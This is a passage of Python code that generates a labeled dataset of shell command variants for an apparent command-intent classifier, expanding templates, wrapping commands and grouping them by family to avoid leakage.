    "{cmd} | tr -d '\\r'",
    "nohup {cmd} &",
    "{cmd} ; echo done",
    "test -e / && {cmd}",
    "/bin/{cmd}",
    "/usr/bin/{cmd}",
]

SHELL_BUILTINS = {"set", "cd", "alias", "exit", "history", "builtin", "shopt", "export", "echo"}


def _expand_family(fam: Family, rng: random.Random) -> List[str]:
    """Expands one family into a bounded, de-duplicated list of realistic command variants."""
    base_cmds: List[str] = []

    if fam.template:
        template = fam.template
        used_keys = [k for k in POOLS if "{" + k + "}" in template]
        if used_keys:
            pools = [POOLS[k] for k in used_keys]
            combos = list(itertools.product(*pools))
            rng.shuffle(combos)
            for combo in combos[:30]:
                cmd = template
                for k, v in zip(used_keys, combo):
                    cmd = cmd.replace("{" + k + "}", v)
                base_cmds.append(cmd)
        else:
            base_cmds.append(template)

    if fam.variants:
        for v in fam.variants:
            if "{IP}" in v:
                for ip in POOLS["IP"][:5]:
                    base_cmds.append(v.replace("{IP}", ip))
            else:
                base_cmds.append(v)

    if not base_cmds and fam.template:
        base_cmds.append(fam.template)

    variants: List[str] = []
    for bc in base_cmds:
        for w in SHELL_WRAPPERS:
            if "2>" in bc and "2>" in w:
                continue
            if "|" in bc and "|" in w:
                continue
            if ("/bin/" in bc or "/usr/bin/" in bc) and ("/bin/" in w or "/usr/bin/" in w):
                continue
            if ("/bin/" in w or "/usr/bin/" in w):
                if " " in bc or "/" in bc or bc.strip() in SHELL_BUILTINS:
                    continue
            wrapped = w.format(cmd=bc).strip()
            variants.append(wrapped)

    rng.shuffle(variants)
    unique_variants = list(dict.fromkeys(variants))
    return unique_variants[:MAX_VARIANTS_PER_FAMILY]


def build_dataset() -> Tuple[List[str], List[str], List[str]]:
    """
    Builds the full labeled corpus.

    Returns
    -------
    commands : list[str]   raw command strings (model input)
    labels   : list[str]   intent label per command
    groups   : list[str]   family_id per command (used for leakage-safe grouping)
    """
    rng = random.Random(RANDOM_SEED)
    commands: List[str] = []
    labels: List[str] = []
    groups: List[str] = []

    seen_ids = set()
    for fam in FAMILIES:
        if fam.family_id in seen_ids:
            raise ValueError(f"Duplicate family_id: {fam.family_id}")
        seen_ids.add(fam.family_id)

        for cmd in _expand_family(fam, rng):
            commands.append(cmd)
            labels.append(fam.intent)
            groups.append(fam.family_id)

    return commands, labels, groups


if __name__ == "__main__":
    cmds, labs, grps = build_dataset()
    from collections import Counter

    uniq = len(set(cmds))
    print(f"Total samples : {len(cmds)}  (unique strings: {uniq})")
    print(f"Total families: {len(set(grps))}")
    print("Class distribution:")
    for intent, n in sorted(Counter(labs).items()):
        fams = len({g for g, l in zip(grps, labs) if l == intent})
        print(f"  {intent:<22} samples={n:<4} families={fams}")
